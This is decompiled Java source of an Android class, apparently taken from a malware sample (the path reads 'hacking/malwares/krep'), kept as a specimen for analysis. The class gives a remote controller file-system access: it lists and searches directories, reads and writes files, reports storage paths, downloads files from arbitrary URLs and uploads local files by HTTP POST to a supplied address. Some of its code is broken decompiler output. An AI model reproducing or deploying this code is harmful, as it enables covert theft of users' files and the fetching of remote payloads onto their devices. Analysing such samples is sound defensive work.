package krep.itmtd.ywtjexf;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Environment;
import android.util.Log;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class MeFile
{
  Context mContext;
  
  MeFile(Context paramContext)
  {
    this.mContext = paramContext;
  }
  
  public static String convertStreamToString(InputStream paramInputStream)
    throws Exception
  {
    paramInputStream = new BufferedReader(new InputStreamReader(paramInputStream));
    StringBuilder localStringBuilder = new StringBuilder();
    for (;;)
    {
      String str = paramInputStream.readLine();
      if (str == null)
      {
        paramInputStream.close();
        return localStringBuilder.toString();
      }
      localStringBuilder.append(str).append("\n");
    }
  }
  
  private List<File> getListFiles(File paramFile, String paramString)
  {
    ArrayList localArrayList = new ArrayList();
    paramFile = paramFile.listFiles();
    int j = paramFile.length;
    int i = 0;
    if (i >= j) {
      return localArrayList;
    }
    File localFile = paramFile[i];
    if (localFile.isDirectory()) {
      localArrayList.addAll(getListFiles(localFile, paramString));
    }
    for (;;)
    {
      i += 1;
      break;
      if (localFile.getName().contains(paramString)) {
        localArrayList.add(localFile);
      }
    }
  }
  
  public static String read(String paramString)
    throws Exception
  {
    paramString = new FileInputStream(new File(paramString));
    String str = convertStreamToString(paramString);
    paramString.close();
    return str;
  }
  
  @SuppressLint({"NewApi"})
  public String Info(String paramString)
    throws JSONException
  {
    paramString = new File(paramString);
    JSONObject localJSONObject = new JSONObject();
    localJSONObject.put("name", paramString.getName());
    localJSONObject.put("dir", paramString.isDirectory());
    localJSONObject.put("canExecute", paramString.canExecute());
    localJSONObject.put("canRead", paramString.canRead());
    localJSONObject.put("canWrite", paramString.canWrite());
    localJSONObject.put("length", paramString.length());
    localJSONObject.put("getUsableSpace", paramString.getUsableSpace());
    localJSONObject.put("getAbsolutePath", paramString.getAbsolutePath());
    return localJSONObject.toString();
  }
  
  public void Lg(String paramString)
  {
    Log.i("ggg", paramString);
  }
  
  @SuppressLint({"NewApi"})
  public String ReadDir(String paramString)
    throws JSONException
  {
    paramString = new File(paramString).listFiles();
    JSONObject localJSONObject1 = new JSONObject();
    JSONArray localJSONArray = new JSONArray();
    int i = 0;
    for (;;)
    {
      if (i >= paramString.length)
      {
        localJSONObject1.put("result", localJSONArray);
        return localJSONObject1.toString();
      }
      JSONObject localJSONObject2 = new JSONObject();
      localJSONObject2.put("name", paramString[i].getName());
      localJSONObject2.put("dir", paramString[i].isDirectory());
      localJSONObject2.put("canExecute", paramString[i].canExecute());
      localJSONObject2.put("canRead", paramString[i].canRead());
      localJSONObject2.put("canWrite", paramString[i].canWrite());
      localJSONObject2.put("length", paramString[i].length());
      localJSONObject2.put("getUsableSpace", paramString[i].getUsableSpace());
      localJSONObject2.put("getAbsolutePath", paramString[i].getAbsolutePath());
      localJSONArray.put(localJSONObject2);
      i += 1;
    }
  }
  
  @SuppressLint({"NewApi"})
  public String SystemDirs()
    throws JSONException
  {
    JSONObject localJSONObject = new JSONObject();
    localJSONObject.put("isExternalStorageEmulated", Environment.isExternalStorageEmulated());
    localJSONObject.put("isExternalStorageRemovable", Environment.isExternalStorageRemovable());
    localJSONObject.put("DIRECTORY_ALARMS", Environment.DIRECTORY_ALARMS);
    localJSONObject.put("DIRECTORY_DCIM", Environment.DIRECTORY_DCIM);
    localJSONObject.put("DIRECTORY_DOWNLOADS", Environment.DIRECTORY_DOWNLOADS);
    localJSONObject.put("DIRECTORY_MOVIES", Environment.DIRECTORY_MOVIES);
    localJSONObject.put("DIRECTORY_MUSIC", Environment.DIRECTORY_MUSIC);
    localJSONObject.put("DIRECTORY_NOTIFICATIONS", Environment.DIRECTORY_NOTIFICATIONS);
    localJSONObject.put("DIRECTORY_PICTURES", Environment.DIRECTORY_PICTURES);
    localJSONObject.put("DIRECTORY_PODCASTS", Environment.DIRECTORY_PODCASTS);
    localJSONObject.put("DIRECTORY_RINGTONES", Environment.DIRECTORY_RINGTONES);
    localJSONObject.put("MEDIA_BAD_REMOVAL", "bad_removal");
    localJSONObject.put("MEDIA_CHECKING", "checking");
    localJSONObject.put("MEDIA_MOUNTED", "mounted");
    localJSONObject.put("MEDIA_MOUNTED_READ_ONLY", "mounted_ro");
    localJSONObject.put("MEDIA_NOFS", "nofs");
    localJSONObject.put("MEDIA_REMOVED", "removed");
    localJSONObject.put("MEDIA_SHARED", "shared");
    localJSONObject.put("MEDIA_UNMOUNTABLE", "unmountable");
    localJSONObject.put("MEDIA_UNMOUNTED", "unmounted");
    localJSONObject.put("DataDirectory", Environment.getDataDirectory());
    localJSONObject.put("DownloadCacheDirectory", Environment.getDownloadCacheDirectory());
    localJSONObject.put("ExternalStorageDirectory", Environment.getExternalStorageDirectory());
    localJSONObject.put("ExternalStorageState", Environment.getExternalStorageState());
    localJSONObject.put("RootDirectory", Environment.getRootDirectory());
    return localJSONObject.toString();
  }
  
  /* Error */
  public void file2url(String paramString1, String paramString2)
  {
    // Byte code:
    //   0: new 88	java/io/FileInputStream
    //   3: dup
    //   4: new 55	java/io/File
    //   7: dup
    //   8: aload_1
    //   9: invokespecial 91	java/io/File:<init>	(Ljava/lang/String;)V
    //   12: invokespecial 94	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   15: astore 5
    //   17: new 279	java/net/URL
    //   20: dup
    //   21: aload_2
    //   22: invokespecial 280	java/net/URL:<init>	(Ljava/lang/String;)V
    //   25: invokevirtual 284	java/net/URL:openConnection	()Ljava/net/URLConnection;
    //   28: checkcast 286	java/net/HttpURLConnection
    //   31: astore_2
    //   32: aload_2
    //   33: iconst_1
    //   34: invokevirtual 290	java/net/HttpURLConnection:setDoInput	(Z)V
    //   37: aload_2
    //   38: iconst_1
    //   39: invokevirtual 293	java/net/HttpURLConnection:setDoOutput	(Z)V
    //   42: aload_2
    //   43: iconst_0
    //   44: invokevirtual 296	java/net/HttpURLConnection:setUseCaches	(Z)V
    //   47: aload_2
    //   48: ldc_w 298
    //   51: invokevirtual 301	java/net/HttpURLConnection:setRequestMethod	(Ljava/lang/String;)V
    //   54: aload_2
    //   55: ldc_w 303
    //   58: ldc_w 305
    //   61: invokevirtual 308	java/net/HttpURLConnection:setRequestProperty	(Ljava/lang/String;Ljava/lang/String;)V
    //   64: aload_2
    //   65: ldc_w 310
    //   68: new 30	java/lang/StringBuilder
    //   71: dup
    //   72: ldc_w 312
    //   75: invokespecial 313	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   78: ldc_w 315
    //   81: invokevirtual 45	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   84: invokevirtual 41	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   87: invokevirtual 308	java/net/HttpURLConnection:setRequestProperty	(Ljava/lang/String;Ljava/lang/String;)V
    //   90: new 317	java/io/DataOutputStream
    //   93: dup
    //   94: aload_2
    //   95: invokevirtual 321	java/net/HttpURLConnection:getOutputStream	()Ljava/io/OutputStream;
    //   98: invokespecial 324	java/io/DataOutputStream:<init>	(Ljava/io/OutputStream;)V
    //   101: astore 6
    //   103: aload 6
    //   105: new 30	java/lang/StringBuilder
    //   108: dup
    //   109: ldc_w 326
    //   112: invokestatic 330	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   115: invokespecial 313	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   118: ldc_w 315
    //   121: invokevirtual 45	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   124: ldc_w 332
    //   127: invokevirtual 45	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   130: invokevirtual 41	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   133: invokevirtual 335	java/io/DataOutputStream:writeBytes	(Ljava/lang/String;)V
    //   136: aload 6
    //   138: new 30	java/lang/StringBuilder
    //   141: dup
    //   142: ldc_w 337
    //   145: invokespecial 313	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   148: aload_1
    //   149: invokevirtual 45	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   152: ldc_w 339
    //   155: invokevirtual 45	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   158: ldc_w 332
    //   161: invokevirtual 45	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   164: invokevirtual 41	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   167: invokevirtual 335	java/io/DataOutputStream:writeBytes	(Ljava/lang/String;)V
    //   170: aload 6
    //   172: ldc_w 332
    //   175: invokevirtual 335	java/io/DataOutputStream:writeBytes	(Ljava/lang/String;)V
    //   178: aload 5
    //   180: invokevirtual 343	java/io/FileInputStream:available	()I
    //   183: ldc_w 344
    //   186: invokestatic 350	java/lang/Math:min	(II)I
    //   189: istore_3
    //   190: iload_3
    //   191: newarray <illegal type>
    //   193: astore_1
    //   194: aload 5
    //   196: aload_1
    //   197: iconst_0
    //   198: iload_3
    //   199: invokevirtual 353	java/io/FileInputStream:read	([BII)I
    //   202: istore 4
    //   204: iload 4
    //   206: ifgt +76 -> 282
    //   209: aload 6
    //   211: ldc_w 332
    //   214: invokevirtual 335	java/io/DataOutputStream:writeBytes	(Ljava/lang/String;)V
    //   217: aload 6
    //   219: new 30	java/lang/StringBuilder
    //   222: dup
    //   223: ldc_w 326
    //   226: invokestatic 330	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   229: invokespecial 313	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   232: ldc_w 315
    //   235: invokevirtual 45	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   238: ldc_w 326
    //   241: invokevirtual 45	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   244: ldc_w 332
    //   247: invokevirtual 45	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   250: invokevirtual 41	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   253: invokevirtual 335	java/io/DataOutputStream:writeBytes	(Ljava/lang/String;)V
    //   256: aload_2
    //   257: invokevirtual 356	java/net/HttpURLConnection:getResponseCode	()I
    //   260: pop
    //   261: aload_2
    //   262: invokevirtual 359	java/net/HttpURLConnection:getResponseMessage	()Ljava/lang/String;
    //   265: pop
    //   266: aload 5
    //   268: invokevirtual 97	java/io/FileInputStream:close	()V
    //   271: aload 6
    //   273: invokevirtual 362	java/io/DataOutputStream:flush	()V
    //   276: aload 6
    //   278: invokevirtual 363	java/io/DataOutputStream:close	()V
    //   281: return
    //   282: aload 6
    //   284: aload_1
    //   285: iconst_0
    //   286: iload_3
    //   287: invokevirtual 367	java/io/DataOutputStream:write	([BII)V
    //   290: aload 5
    //   292: invokevirtual 343	java/io/FileInputStream:available	()I
    //   295: ldc_w 344
    //   298: invokestatic 350	java/lang/Math:min	(II)I
    //   301: istore_3
    //   302: aload 5
    //   304: aload_1
    //   305: iconst_0
    //   306: iload_3
    //   307: invokevirtual 353	java/io/FileInputStream:read	([BII)I
    //   310: istore 4
    //   312: goto -108 -> 204
    //   315: astore_1
    //   316: return
    //   317: astore_1
    //   318: return
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	319	0	this	MeFile
    //   0	319	1	paramString1	String
    //   0	319	2	paramString2	String
    //   189	118	3	i	int
    //   202	109	4	j	int
    //   15	288	5	localFileInputStream	FileInputStream
    //   101	182	6	localDataOutputStream	java.io.DataOutputStream
    // Exception table:
    //   from	to	target	type
    //   0	103	315	java/lang/Exception
    //   103	204	317	java/lang/Exception
    //   209	281	317	java/lang/Exception
    //   282	312	317	java/lang/Exception
  }
  
  public void mkdir(String paramString)
  {
    paramString = new File(paramString);
    if (!paramString.exists()) {
      paramString.mkdir();
    }
  }
  
  @SuppressLint({"NewApi"})
  public String search(String paramString1, String paramString2)
    throws JSONException
  {
    paramString1 = getListFiles(new File(paramString1), paramString2);
    paramString2 = new JSONObject();
    JSONArray localJSONArray = new JSONArray();
    int i = 0;
    for (;;)
    {
      if (i >= paramString1.size())
      {
        paramString2.put("result", localJSONArray);
        return paramString2.toString();
      }
      JSONObject localJSONObject = new JSONObject();
      localJSONObject.put("name", ((File)paramString1.get(i)).getName());
      localJSONObject.put("dir", ((File)paramString1.get(i)).isDirectory());
      localJSONObject.put("canExecute", ((File)paramString1.get(i)).canExecute());
      localJSONObject.put("canRead", ((File)paramString1.get(i)).canRead());
      localJSONObject.put("canWrite", ((File)paramString1.get(i)).canWrite());
      localJSONObject.put("length", ((File)paramString1.get(i)).length());
      localJSONObject.put("getUsableSpace", ((File)paramString1.get(i)).getUsableSpace());
      localJSONObject.put("getAbsolutePath", ((File)paramString1.get(i)).getAbsolutePath());
      localJSONArray.put(localJSONObject);
      i += 1;
    }
  }
  
  public void showToast(String paramString)
  {
    Toast.makeText(this.mContext, paramString, 1).show();
  }
  
  public void url2file(String paramString1, String paramString2)
  {
    try
    {
      paramString1 = new URL(paramString1);
      Object localObject = paramString1.openConnection();
      ((URLConnection)localObject).connect();
      int i = ((URLConnection)localObject).getContentLength();
      paramString1 = paramString1.openStream();
      paramString2 = new FileOutputStream(paramString2);
      localObject = new byte['Ѐ'];
      long l = 0L;
      for (;;)
      {
        int j = paramString1.read((byte[])localObject);
        if (j == -1)
        {
          paramString1.close();
          paramString2.close();
          return;
        }
        l += j;
        int k = (int)l * 100 / i;
        paramString2.write((byte[])localObject, 0, j);
      }
      return;
    }
    catch (Exception paramString1)
    {
      Log.e("ERROR DOWNLOADING", "Unable to download" + paramString1.getMessage());
    }
  }
  
  public void write(String paramString1, String paramString2)
  {
    try
    {
      paramString1 = new FileWriter(new File(paramString1));
      paramString1.write(paramString2);
      paramString1.close();
      return;
    }
    catch (IOException paramString1) {}
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/krep/classes-dex2jar.jar!/krep/itmtd/ywtjexf/MeFile.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */